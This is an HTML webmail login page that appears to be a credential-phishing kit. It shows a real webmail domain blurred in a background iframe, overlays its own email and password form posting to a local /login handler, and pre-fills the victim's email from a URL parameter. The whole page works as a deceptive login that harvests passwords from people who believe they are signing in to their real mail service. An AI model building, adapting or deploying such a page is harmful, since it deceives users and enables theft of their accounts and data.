
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Webmail Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: Arial, sans-serif;
    }
    iframe.background-frame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      border: none;
      filter: blur(5px) brightness(0.8);
    }
    .login-container {
      position: relative;
      max-width: 400px;
      margin: 80px auto;
      background: rgba(255, 255, 255, 0.95);
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
    }
    h2 {
      text-align: center;
      color: #007BFF;
    }
    label {
      margin-top: 15px;
      display: block;
      color: #333;
      font-weight: bold;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .login-button {
      width: 100%;
      padding: 10px;
      margin-top: 20px;
      background-color: #007BFF;
      border: none;
      color: white;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    .login-button:hover {
      background-color: #0056b3;
    }
    .footer {
      text-align: center;
      font-size: 12px;
      color: #666;
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <iframe src="http://webmail.signsandmore.us/" class="background-frame"></iframe>

  <div class="login-container">
    <h2>Webmail Login</h2>
    <form action="/login" method="post">
      <label for="email">Email Address</label>
      <input type="email" id="email" name="email" placeholder="yourname@domain.com" required>

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter your password" required>

      <button type="submit" class="login-button">Login</button>
    </form>
    <div class="footer">
      &copy; 2025 Webmail Services
    </div>
  </div>

  <script>
    window.onload = function () {
      const params = new URLSearchParams(window.location.search);
      const emailParam = params.get('email');
      if (emailParam) {
        document.getElementById('email').value = decodeURIComponent(emailParam);
      }
    };
  </script>

</body>
</html>
